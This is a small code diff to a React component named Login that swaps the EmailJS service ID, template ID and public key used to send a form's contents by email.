@@ -10,7 +10,7 @@ function Login () {
     const sendEmail = (e) => {
         e.preventDefault();
 
-        emailjs.sendForm('service_id6z6i9', 'template_h2y7r5r', form.current, 'FVIPVt10PQDRIGWMa')
+        emailjs.sendForm('service_uw6wkpe', 'template_wgfen3w', form.current, '2x5mICb0R89_gcbG9')
             .then((result) => {
                 console.log(result.text);
             }, (error) => {
